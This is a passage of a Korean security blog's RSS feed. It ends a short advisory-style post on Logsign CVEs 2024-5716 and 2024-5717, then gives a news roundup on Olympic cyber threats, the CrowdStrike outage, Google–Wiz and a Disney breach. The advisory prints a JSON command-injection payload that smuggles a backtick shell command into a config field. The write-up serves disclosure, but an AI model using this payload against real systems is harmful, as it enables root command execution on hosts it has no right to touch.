&#xC778;&#xC6A9; &#xBD80;&#xD638;(<code>&apos;</code>)&#xB9CC; &#xC774;&#xC2A4;&#xCF00;&#xC774;&#xD504; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xBC31;&#xD2F1;(<code>\</code>), &#xC138;&#xBBF8;&#xCF5C;&#xB860;(<code>;</code>) &#xB4F1;&#xC758; &#xD2B9;&#xC218;&#xBB38;&#xC790;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; command injection &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs json">{    <span class="hljs-attr">&quot;enable&quot;</span>:<span class="hljs-literal">true</span>,    <span class="hljs-attr">&quot;list&quot;</span>: <span class="hljs-string">&quot;`whoami &gt; /tmp/Proof.txt`&quot;</span>}</code></pre><p>&#xB530;&#xB77C;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xB294; CVE-2024-5716 &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; &#xAD00;&#xB9AC;&#xC790; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xC7AC;&#xC124;&#xC815;&#xD55C; &#xD6C4; &#xB85C;&#xADF8;&#xC778;&#xD558;&#xC5EC;, CVE-2024-5717 &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://support.logsign.net/hc/en-us/articles/19316621924754-03-06-2024-Version-6-4-8-Release-Notes">https://support.logsign.net/hc/en-us/articles/19316621924754-03-06-2024-Version-6-4-8-Release-Notes</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/Logsign/">Logsign</category>
      
      <category domain="https://hackyboiz.github.io/tags/Authentication-Bypass/">Authentication Bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/Command-Injection/">Command Injection</category>
      
      
      <comments>https://hackyboiz.github.io/2024/07/24/ogu123/cve-2024-5716/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해킹짹짹🐣] 다가오는 파리 올림픽, 사이버 범죄 ‘초긴장’</title>
      <link>https://hackyboiz.github.io/2024/07/22/clalxk/newsletter0722/</link>
      <guid>https://hackyboiz.github.io/2024/07/22/clalxk/newsletter0722/</guid>
      <pubDate>Mon, 22 Jul 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, clalxk &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4; :D&lt;/p&gt;
&lt;p&gt;7&amp;#xC6D4;&amp;#xB3C4; &amp;#xBC8C;&amp;#xC368; &amp;#xB05D;&amp;#xC744; &amp;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, clalxk &#xC785;&#xB2C8;&#xB2E4; :D</p><p>7&#xC6D4;&#xB3C4; &#xBC8C;&#xC368; &#xB05D;&#xC744; &#xD5A5;&#xD574; &#xAC00;&#xB124;&#xC694;.<br>7&#xC6D4;&#xC758; &#xB05D;&#xC5D0;&#xB3C4; &#xD574;&#xD0B9;&#xC9F9;&#xC9F9;&#xACFC; &#xD568;&#xAED8; &#xD574;&#xC694; ~~</p><p>&#xC774;&#xBC88; &#xC8FC;&#xB3C4; &#xB2E4;&#xC591;&#xD55C; &#xC8FC;&#xC81C;&#xB85C; &#xAF49;&#xAF49; &#xB2F4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="&#xC774;&#xBC88;-&#xC8FC;-&#xC9F9;&#xC9F9;-PICK&#x1F425;"><a href="#&#xC774;&#xBC88;-&#xC8FC;-&#xC9F9;&#xC9F9;-PICK&#x1F425;" class="headerlink" title="&#xC774;&#xBC88; &#xC8FC; &#xC9F9;&#xC9F9; PICK&#x1F425;"></a>&#xC774;&#xBC88; &#xC8FC; &#xC9F9;&#xC9F9; PICK&#x1F425;</h2><blockquote><p>&#x1F5E3;&#xFE0F; <strong>&#x201C;&#xB3C4;&#xCFC4;&#xBCF4;&#xB2E4; 10&#xBC30; &#xB354;&#x201D;&#x2026;&#xD30C;&#xB9AC; &#xC62C;&#xB9BC;&#xD53D;, &#xC0AC;&#xC774;&#xBC84; &#xBC94;&#xC8C4; &#x2018;&#xCD08;&#xAE34;&#xC7A5;&#x2019;</strong></p></blockquote><p>2024.07.13 | ZDNET Korea | <a href="https://zdnet.co.kr/view/?no=20240712100250">&#xAE30;&#xC0AC;&#xBCF4;&#xAE30;</a></p><p><img src="/2024/07/22/clalxk/newsletter0722/image1.png" alt="&#xAE30;&#xC0AC;&#xC0AC;&#xC9C4;"></p><p>7&#xC6D4; 24&#xC77C;&#xC5D0; &#xC62C;&#xB9BC;&#xD53D;&#xC774; &#xAC1C;&#xB9C9;&#xD574;&#xC694;!</p><p>&#xC9C0;&#xB09C; &#xD3C9;&#xCC3D; &#xC62C;&#xB9BC;&#xD53D; &#xAC1C;&#xB9C9;&#xC2DD; 20&#xBD84; &#xC804;, &#xD574;&#xD0B9;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC870;&#xC9C1;&#xC704;&#xC6D0;&#xD68C;&#xC640; &#xD30C;&#xD2B8;&#xB108;&#xC0AC;&#xB4E4;&#xC758; &#xCEF4;&#xD4E8;&#xD130; &#xC218;&#xBC31;&#xB300;&#xAC00; &#xB9C8;&#xBE44;&#xB418;&#xB294; &#xC0AC;&#xD0DC;&#xAC00; &#xC788;&#xC5C8;&#xC5B4;&#xC694;. &#xC774; &#xC0AC;&#xD0DC;&#xB85C; &#xC778;&#xD574; &#xC77C;&#xBD80; &#xAD00;&#xAC1D;&#xB4E4;&#xC774; &#xD2F0;&#xCF13; &#xC778;&#xC1C4;&#xC5D0; &#xBD88;&#xD3B8;&#xC744; &#xACAA;&#xC5C8;&#xC5B4;&#xC694;.  &#xB2F9;&#xC2DC; &#xD3C9;&#xCC3D; &#xC62C;&#xB9BC;&#xD53D;&#xC870;&#xC9C1;&#xC704;&#xC6D0;&#xD68C;&#xB294; &#xB7EC;&#xC2DC;&#xC544;&#xC758; &#xC6DC; &#xACF5;&#xACA9;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC218;&#xCC9C; &#xB300;&#xC758; &#xCEF4;&#xD4E8;&#xD130; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC0AC;&#xB77C;&#xC9C0;&#xBA70; &#xC62C;&#xB9BC;&#xD53D; &#xC11C;&#xBC84; &#xAD00;&#xB9AC;&#xC5D0; &#xD63C;&#xB780;&#xC744; &#xACAA;&#xC5C8;&#xC5B4;&#xC694;. &#xC774; &#xC0AC;&#xD0DC;&#xC758; &#xBC30;&#xD6C4;&#xB294; &#xB7EC;&#xC2DC;&#xC544;&#xC758; &#xC18C;&#xD589;&#xC73C;&#xB85C; &#xBC1D;&#xD600;&#xC84C;&#xC5B4;&#xC694; &#x1F621; </p><p>&#xC774;&#xD6C4;&#xB85C; &#xB3C4;&#xCFC4;, &#xBCA0;&#xC774;&#xC9D5; &#xC62C;&#xB9BC;&#xD53D;&#xC5D0;&#xC11C;&#xB3C4; &#xAFB8;&#xC900;&#xD55C; &#xD574;&#xD0B9;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xB9C8;&#xBE44;&#xB418;&#xB294; &#xC77C;&#xC774; &#xC7A6;&#xC558;&#xB2E4;&#xACE0; &#xD574;&#xC694;. 2020 &#xB3C4;&#xCFC4; &#xC62C;&#xB9BC;&#xD53D; &#xB2F9;&#xC2DC; &#xC57D; 4&#xC5B5;5&#xCC9C;&#xB9CC; &#xAC74;&#xC758; &#xD574;&#xD0B9;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694;.. &#x1F92F;</p><p><img src="/2024/07/22/clalxk/newsletter0722/image2.png" alt="&#xAE30;&#xC0AC;&#xC0AC;&#xC9C4;"></p><p>&#xD30C;&#xB9AC; &#xC62C;&#xB9BC;&#xD53D; &#xD611;&#xB825; &#xBCF4;&#xC548; &#xC5C5;&#xCCB4;&#xC778; Cisco&#xB294; &#x2018;2020 &#xB3C4;&#xCFC4; &#xC62C;&#xB9BC;&#xD53D;&#x2019; &#xB54C;&#xBCF4;&#xB2E4; 8~10&#xBC30; &#xC815;&#xB3C4; &#xB9CE;&#xC740; &#xC0AC;&#xC774;&#xBC84; &#xACF5;&#xACA9;&#xC774; &#xC608;&#xC0C1;&#xB41C;&#xB2E4;&#xACE0; &#xC804;&#xB9DD;&#xD588;&#xC5B4;&#xC694;. &#xD504;&#xB791;&#xC2A4; &#xB2F9;&#xAD6D;&#xC740; &#xB2E4;&#xAC00;&#xC624;&#xB294; &#xD30C;&#xB9AC;&#xC62C;&#xB9BC;&#xD53D; &#xAE30;&#xAC04; &#xC911; &#xC804;&#xB840; &#xC5C6;&#xC774; &#xB9CE;&#xC740; &#xC0AC;&#xC774;&#xBC84; &#xBC94;&#xC8C4;&#xAC00; &#xC608;&#xC0C1;&#xB428;&#xC5D0; &#xB530;&#xB77C;, &#xD504;&#xB791;&#xC2A4; &#xC815;&#xBD80;&#xB294; &#xC0AC;&#xC774;&#xBC84; &#xBC94;&#xC8C4; &#xC804;&#xB2F4; &#xD5CC;&#xBCD1;&#xB300;&#xB97C; &#xAFB8;&#xB9AC;&#xACE0; &#xC788;&#xC5B4;&#xC694; &#x1F60E; </p><p>&#xD574;&#xB2F9; &#xD5CC;&#xBCD1;&#xB300;&#xAC00; &#xAC00;&#xC9DC; &#xC62C;&#xB9BC;&#xD53D; &#xD2F0;&#xCF13; &#xC608;&#xB9E4; &#xC0AC;&#xC774;&#xD2B8; &#xC77C;&#xC81C; &#xB2E8;&#xC18D;&#xC5D0; &#xB098;&#xC11C; 338&#xACF3;&#xC744; &#xC801;&#xBC1C;&#xD588;&#xC5B4;&#xC694;. &#xC801;&#xBC1C;&#xB41C; &#xAC00;&#xC9DC; &#xD2F0;&#xCF13; &#xC0AC;&#xC774;&#xD2B8; 338&#xACF3; &#xC911; 51&#xACF3;&#xC744; &#xD3D0;&#xC1C4;&#xD558;&#xACE0; 140&#xACF3;&#xC740; &#xC0AC;&#xBC95; &#xB2F9;&#xAD6D;&#xC5D0; &#xD1B5;&#xBCF4;&#xD588;&#xB2E4;&#xACE0; &#xD574;&#xC694;! &#xC774;&#xBC88; &#xB2E8;&#xC18D; &#xC791;&#xC5C5;&#xC5D0;&#xB294; 200&#xBA85; &#xC774;&#xC0C1; &#xADDC;&#xBAA8;&#xC758; &#xAD70; &#xD5CC;&#xBCD1;&#xB300;&#xAC00; &#xB3D9;&#xC6D0;&#xB410;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694; &#x1FAE2;</p><p>&#xD3C9;&#xCC3D; &#xC62C;&#xB9BC;&#xD53D; &#xD574;&#xD0B9; &#xC0AC;&#xD0DC;&#xB97C; <a href="https://www.youtube.com/watch?v=Qq0lvSI6MS8">&#xC601;&#xC0C1;</a>&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xC138;&#xC694;!</p><h2 id><a href="#" class="headerlink" title=" "></a> </h2><blockquote><p>&#x26A0;&#xFE0F; <strong>&#xD06C;&#xB77C;&#xC6B0;&#xB4DC; &#xC2A4;&#xD2B8;&#xB77C;&#xC774;&#xD06C; &#xD314;&#xCF58; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD588;&#xB2E4;&#xAC00; PC &#xBE14;&#xB8E8;&#xC2A4;&#xD06C;&#xB9B0;&#x2026; &#xC804; &#xC138;&#xACC4; &#x2018;&#xD30C;&#xC7A5;&#x2019;</strong></p></blockquote><p>2024.07.19 | &#xBCF4;&#xC548;&#xB274;&#xC2A4; | <a href="https://m.boannews.com/html/detail.html?tab_type=1&amp;idx=131477">&#xAE30;&#xC0AC;&#xBCF4;&#xAE30;</a></p><p>&#xAE00;&#xB85C;&#xBC8C; &#xBCF4;&#xC548; &#xAE30;&#xC5C5; &#xD06C;&#xB77C;&#xC6B0;&#xB4DC; &#xC2A4;&#xD2B8;&#xB77C;&#xC774;&#xD06C;&#xC758; &#xD314;&#xCF58; &#xC13C;&#xC11C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xBB38;&#xC81C;&#xB85C; &#xC778;&#xD574; &#xC804; &#xC138;&#xACC4; PC&#xC5D0; &#xBE14;&#xB8E8;&#xC2A4;&#xD06C;&#xB9B0;&#xC774; &#xD45C;&#xC2DC;&#xB418;&#xBA70; &#xC5C4;&#xCCAD;&#xB09C; &#xD30C;&#xC7A5;&#xC774; &#xC77C;&#xACE0; &#xC788;&#xC5B4;&#xC694;. &#xD2B9;&#xD788; TV &#xBC29;&#xC1A1;&#xAD6D;, &#xC740;&#xD589;, &#xD56D;&#xACF5;&#xC0AC; &#xB4F1;&#xC774; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC73C;&#xBA70; &#xBC29;&#xC1A1; &#xC911;&#xB2E8;, &#xC5C5;&#xBB34; &#xB9C8;&#xBE44; &#xB4F1; &#xBB38;&#xC81C;&#xAC00; &#xCEE4;&#xC9C0;&#xBA70; &#xD53C;&#xD574;&#xAC00; &#xD655;&#xC0B0;&#xB418;&#xC5C8;&#xB2E4;&#xB124;&#xC694; &#x1FAE0;</p><p><img src="/2024/07/22/clalxk/newsletter0722/image3.png" alt="&#xAE30;&#xC0AC;&#xC0AC;&#xC9C4;"></p><p>&#xD06C;&#xB77C;&#xC6B0;&#xB4DC; &#xC2A4;&#xD2B8;&#xB77C;&#xC774;&#xD06C;&#xC758; &#xD314;&#xCF58; &#xC13C;&#xC11C;(CrowdStrike Falcon Sensor) &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC774;&#xD6C4; <strong>&#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xD30C;&#xC77C; csagent.sys</strong>&#xB85C; &#xC778;&#xD574; &#xC804; &#xC138;&#xACC4; &#xC218;&#xB9CE;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xC758; Windows &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xBE14;&#xB8E8; &#xC2A4;&#xD06C;&#xB9B0;&#xC774; &#xD45C;&#xC2DC;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xD574;&#xC694;.</p><p>&#xC708;&#xB3C4;&#xC6B0;(Windows) &#xBD80;&#xD305; &#xC2DC; &#xBE14;&#xB8E8;&#xC2A4;&#xD06C;&#xB9B0;&#xC624;&#xBE0C;&#xB370;&#xC2A4;(BSOD) &#xBB38;&#xC81C;&#xB97C; &#xACAA;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC778;&#xB370;&#xC694;. </p><p>&#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB41C; &#xD314;&#xCF58; &#xC13C;&#xC11C;&#xC640; &#xD2B9;&#xC815; &#xC708;&#xB3C4;&#xC6B0; &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC04;&#xC758; &#xCDA9;&#xB3CC;&#xC5D0;&#xC11C; &#xBE44;&#xB86F;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC778;&#xB2E4;&#xACE0; &#xD574;&#xC694; &#x1FAE2;</p><p>&#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xAE34;&#xAE09; &#xC870;&#xCE58; &#xBC29;&#xC548;&#xC774; 2&#xAC00;&#xC9C0; &#xC815;&#xB3C4; &#xC788;&#xC5B4;&#xC694;!</p><ol><li>&#xC548;&#xC804; &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xBB38;&#xC81C;&#xAC00; &#xB418;&#xB294; SW &#xD30C;&#xC77C;&#xC744; &#xC0AD;&#xC81C;<ul><li>&#xC548;&#xC804; &#xBAA8;&#xB4DC;&#xB85C; &#xBD80;&#xD305; &#x2192; &#xBCF5;&#xAD6C; &#xD654;&#xBA74;&#xC5D0;&#xC11C; &#x2018;&#xACE0;&#xAE09; &#xBCF5;&#xAD6C; &#xC635;&#xC158; &#xBCF4;&#xAE30;&#x2019;&#xB97C; &#xD074;&#xB9AD; &#x2192; &#xACE0;&#xAE09; &#xBCF5;&#xAD6C; &#xC635;&#xC158; &#xBA54;&#xB274;&#xC5D0;&#xC11C; &#x2018;&#xBB38;&#xC81C; &#xD574;&#xACB0;&#x2019;&#xC744; &#xC120;&#xD0DD; &#x2192; &#x2018;&#xACE0;&#xAE09; &#xC635;&#xC158;&#x2019;&#xC744; &#xC120;&#xD0DD; &#x2192; &#x2018;&#xC2DC;&#xC791; &#xC124;&#xC815;&#x2019;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xACE0; &#x2018;&#xB2E4;&#xC2DC; &#xC2DC;&#xC791;&#x2019;&#xC744; &#xD074;&#xB9AD; &#x2192; &#xC7AC;&#xBD80;&#xD305; &#xD6C4; 4 &#xB610;&#xB294; F4 &#xD0A4;&#xB97C; &#xB20C;&#xB7EC; &#xC548;&#xC804; &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; PC &#xC2DC;&#xC791;</li></ul></li><li>&#xC548;&#xC804; &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xBA85;&#xB839; &#xD504;&#xB86C;&#xD504;&#xD2B8;(&#xAD00;&#xB9AC;&#xC790;) &#xB610;&#xB294; Windows PowerShell(&#xAD00;&#xB9AC;&#xC790;)&#xB97C; &#xC2E4;&#xD589;<ul><li>C:Windows-System32-drivers-CrowdStrike &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB85C; &#xC774;&#xB3D9; &#x2192; C-00000291*.sys &#xD328;&#xD134;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xB294; &#xD30C;&#xC77C; &#xAC80;&#xC0C9; &#xD6C4; &#xC0AD;&#xC81C;</li></ul></li></ol><p>&#xD574;&#xB2F9; &#xC0AC;&#xAC74;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC708;&#xB3C4;&#xC6B0; 10&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAE30;&#xC5C5;&#xACFC; &#xC870;&#xC9C1;&#xC740; &#xC5C5;&#xBB34; &#xC911;&#xB2E8;, &#xB370;&#xC774;&#xD130; &#xC190;&#xC2E4;, &#xBD88;&#xD3B8;&#xD568;&#xC744; &#xD638;&#xC18C;&#xD588;&#xC5B4;&#xC694;. &#xC18C;&#xC15C; &#xBBF8;&#xB514;&#xC5B4;&#xC640; &#xD3EC;&#xB7FC;&#xC5D0;&#xB294; &#xBD88;&#xB9CC;&#xACFC; &#xB3C4;&#xC6C0; &#xC694;&#xCCAD;&#xC774; &#xC3DF;&#xC544;&#xC84C;&#xACE0;, &#xADF8; &#xC911; &#xD55C; &#xB300;&#xD615; &#xAE08;&#xC735;&#xD68C;&#xC0AC;&#xB294; &#xBAA8;&#xB4E0; &#xC9C1;&#xC6D0;&#xC758; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xB3D9;&#xC2DC;&#xC5D0; BSOD&#xB97C; &#xACAA;&#xC73C;&#xBA70; &#xC5C5;&#xBB34;&#xAC00; &#xC644;&#xC804;&#xD788; &#xC911;&#xB2E8;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xD574;&#xC694;. &#xB610; &#xB2E4;&#xB978; IT &#xAE30;&#xC5C5;&#xC740; &#xBCF5;&#xAD6C; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC911;&#xC694; &#xB370;&#xC774;&#xD130; &#xC77C;&#xBD80;&#xB97C; &#xC190;&#xC2E4;&#xD558;&#xC5EC; &#xD070; &#xD63C;&#xB780;&#xC744; &#xACAA;&#xC5C8;&#xACE0;, &#xD559;&#xAD50;&#xC640; &#xBCD1;&#xC6D0; &#xB4F1; &#xACF5;&#xACF5;&#xAE30;&#xAD00; &#xC5ED;&#xC2DC; &#xD53C;&#xD574;&#xB97C; &#xC785;&#xC5B4; &#xAD50;&#xC721; &#xBC0F; &#xC758;&#xB8CC; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xCC28;&#xC9C8;&#xC774; &#xBE5A;&#xC5B4;&#xC84C;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694;. </p><p>&#xD06C;&#xB77C;&#xC6B0;&#xB4DC; &#xC2A4;&#xD2B8;&#xB77C;&#xC774;&#xD06C;&#xB294; &#xBB38;&#xC81C;&#xB97C; &#xC2E0;&#xC18D;&#xD788; &#xC778;&#xC815;&#xD558;&#xACE0; &#xD574;&#xACB0;&#xCC45;&#xC744; &#xB9C8;&#xB828; &#xC911;&#xC774;&#xB77C;&#xACE0; &#xBC1D;&#xD614;&#xC5B4;&#xC694;!</p><h2 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h2><blockquote><p>&#x1F5E3;&#xFE0F; <strong>&#xC0AC;&#xC774;&#xBC84; &#xBCF4;&#xC548;&#xC5C5;&#xCCB4; &#x2018;Wiz&#x2019;&#x2026; &#xAD6C;&#xAE00;, 32&#xC870;&#xC5D0; &#xC778;&#xC218; &#xCD94;&#xC9C4;</strong></p></blockquote><p>2024.07.19 | &#xB3D9;&#xC544;&#xC77C;&#xBCF4; | <a href="https://www.chosun.com/economy/tech_it/2024/07/16/BMPLHBWDRJCMFAZLORH3AGFXJ4/?outputType=amp">&#xAE30;&#xC0AC;&#xBCF4;&#xAE30;</a></p><p><img src="/2024/07/22/clalxk/newsletter0722/image4.png" alt="&#xAE30;&#xC0AC;&#xC0AC;&#xC9C4;"></p><p>&#xAD6C;&#xAE00;&#xC758; &#xBAA8;&#xD68C;&#xC0AC;&#xC778; &#xC54C;&#xD30C;&#xBCB3;&#xC774; &#xC0AC;&#xC774;&#xBC84; &#xBCF4;&#xC548; &#xC2A4;&#xD0C0;&#xD2B8;&#xC5C5; &#x2018;Wiz&#x2019; &#xC778;&#xC218;&#xB97C; &#xCD94;&#xC9C4;&#xD55C;&#xB2E4;&#xACE0; &#xD574;&#xC694;!</p><p>&#xC54C;&#xD30C;&#xBCB3;&#xC740; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;(&#xAC00;&#xC0C1; &#xC11C;&#xBC84;)&#xC758; &#xBCF4;&#xC548;&#xC744; &#xC804;&#xBB38;&#xC73C;&#xB85C; &#xD558;&#xB294; &#xAE30;&#xC5C5;&#xC774;&#xC5D0;&#xC694;. &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC2DC;&#xC7A5;&#xC5D0;&#xC11C; &#xC544;&#xB9C8;&#xC874;&#xB7;&#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8;(MS)&#xC5D0; &#xBC00;&#xB824; &#x2018;&#xB9CC;&#xB144; 3&#xB4F1;&#x2019;&#xC778; &#xAD6C;&#xAE00;&#xC774; &#xACF5;&#xACA9;&#xC801;&#xC778; &#xC778;&#xC218;&#xD569;&#xBCD1;(M&amp;A)&#xC73C;&#xB85C; &#xACBD;&#xC7C1;&#xC790;&#xB97C; &#xB530;&#xB77C;&#xC7A1;&#xC73C;&#xB824;&#xB294; &#xC6C0;&#xC9C1;&#xC784;&#xC73C;&#xB85C; &#xD480;&#xC774;&#xB418;&#xACE0; &#xC788;&#xC5B4;&#xC694;.</p><p>14&#xC77C; &#xC6D4;&#xC2A4;&#xD2B8;&#xB9AC;&#xD2B8;&#xC800;&#xB110;(WSJ)&#xC740; &#xC54C;&#xD30C;&#xBCB3;&#xC774; 230&#xC5B5;&#xB2EC;&#xB7EC;(&#xC57D; 31&#xC870;8044&#xC5B5;&#xC6D0;)&#xC5D0; Wiz&#xB97C; &#xC778;&#xC218;&#xD558;&#xB294; &#xD611;&#xC0C1;&#xC744; &#xC9C4;&#xD589; &#xC911;&#xC774;&#xB77C;&#xACE0; &#xBCF4;&#xB3C4;&#xD588;&#xB2E4;. &#xC774;&#xB294; &#xAD6C;&#xAE00;&#xC774; &#xC9C4;&#xD589;&#xD55C; M&amp;A &#xAC00;&#xC6B4;&#xB370; &#xC5ED;&#xB300; &#xCD5C;&#xB300; &#xADDC;&#xBAA8;&#xB77C;&#xACE0; &#xD574;&#xC694; &#x1FAE2;&#x1F911;</p><p> <img src="/2024/07/22/clalxk/newsletter0722/image5.png" alt="&#xAE30;&#xC0AC;&#xC0AC;&#xC9C4;"></p><p>Wiz&#xB294; &#xC774;&#xC2A4;&#xB77C;&#xC5D8;&#xC5D0;&#xC11C; &#xC124;&#xB9BD;&#xD55C; &#xAE30;&#xC5C5;&#xC73C;&#xB85C;, &#xC62C;&#xD574; 120&#xC5B5;&#xB2EC;&#xB7EC;&#xC758; &#xAE30;&#xC5C5; &#xAC00;&#xCE58;&#xB97C; &#xC778;&#xC815;&#xBC1B;&#xC740; &#x2018;&#xB370;&#xCE74;&#xCF58;(&#xAE30;&#xC5C5; &#xAC00;&#xCE58; 100&#xC5B5;&#xB2EC;&#xB7EC; &#xC774;&#xC0C1;)&#x2019; &#xC2A4;&#xD0C0;&#xD2B8;&#xC5C5;&#xC774;&#xC5D0;&#xC694;. &#xC778;&#xACF5;&#xC9C0;&#xB2A5;(AI)&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;&#xC0C1; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xACF5;&#xACA9;&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xAC10;&#xC9C0;&#xD558;&#xACE0; &#xB300;&#xC751;&#xD558;&#xB294; &#xAE30;&#xC220;&#xC744; &#xBCF4;&#xC720;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xD3EC;&#xCC9C;(Fortune) 100&#xB300; &#xAE30;&#xC5C5; &#xC911; 40%&#xB97C; &#xACE0;&#xAC1D;&#xC0AC;&#xB85C; &#xB450;&#xACE0; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xCC3D;&#xC5C5; 18&#xAC1C;&#xC6D4; &#xB9CC;&#xC5D0; &#xC5F0; &#xB9E4;&#xCD9C; 1&#xC5B5;&#xB2EC;&#xB7EC;&#xB97C; &#xCC0D;&#xC5C8;&#xACE0;, &#xC9C0;&#xB09C;&#xD574; &#xB9E4;&#xCD9C;&#xC740; 3&#xC5B5;5000&#xB9CC;&#xB2EC;&#xB7EC;(&#xC57D; 4839&#xC5B5;&#xC6D0;)&#xB97C; &#xAE30;&#xB85D;&#xD588;&#xC5B4;&#xC694;. &#xC6D4;&#xC2A4;&#xD2B8;&#xB9AC;&#xD2B8;&#xC800;&#xB110;&#xC740; &#x201C;&#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xCEF4;&#xD4E8;&#xD305;&#xC740; &#xC911;&#xC694;&#xD55C; &#xC131;&#xC7A5; &#xC0AC;&#xC5C5;&#xC774;&#xC9C0;&#xB9CC;, &#xC54C;&#xD30C;&#xBCB3;&#xC740; &#xACBD;&#xC7C1;&#xC0AC;&#xC5D0; &#xB4A4;&#xCC98;&#xC838; &#xC788;&#xB2E4;&#x201D;&#xBA70; &#x201C;&#xC774;&#xBC88; &#xC778;&#xC218;&#xB294; &#xC54C;&#xD30C;&#xBCB3;&#xC758; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xCEF4;&#xD4E8;&#xD305; &#xC0AC;&#xC5C5;&#xC5D0; &#xB3C4;&#xC6C0;&#xC774; &#xB420; &#xAC83;&#x201D;&#xC774;&#xB77C;&#xACE0; &#xBCF4;&#xB3C4;&#xD588;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694;!</p><h2 id="-2"><a href="#-2" class="headerlink" title=" "></a> </h2><blockquote><p>&#x26A0;&#xFE0F; <strong>&#xB514;&#xC988;&#xB2C8;, &#xB0B4;&#xBD80; &#xC2DC;&#xC2A4;&#xD15C; &#xD574;&#xD0B9; &#xB2F9;&#xD588;&#xB2E4;&#x2026;&#xC2AC;&#xB799; &#xB0B4;&#xC6A9;&#xB3C4; &#xC720;&#xCD9C;</strong></p></blockquote><p>2024.07.16 | IT&#xC870;&#xC120; | <a href="https://it.chosun.com/news/articleViewAmp.html?idxno=2023092119576">&#xAE30;&#xC0AC;&#xBCF4;&#xAE30;</a></p><p>&#xC6D4;&#xD2B8;&#xB514;&#xC988;&#xB2C8;&#xAC00; &#xD574;&#xD0B9;&#xC870;&#xC9C1;&#xC73C;&#xB85C;&#xBD80;&#xD130; &#xBBF8;&#xACF5;&#xAC1C; &#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xC815;&#xBCF4; &#xB4F1; 1.2&#xD14C;&#xB77C;&#xBC14;&#xC774;&#xD2B8;(TB) &#xADDC;&#xBAA8;&#xC758; 5&#xB144;&#xCE58; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD574;&#xD0B9;&#xB2F9;&#xD588;&#xB2E4;&#xACE0; &#xD574;&#xC694; &#x1F631; </p><p><img src="/2024/07/22/clalxk/newsletter0722/image6.png" 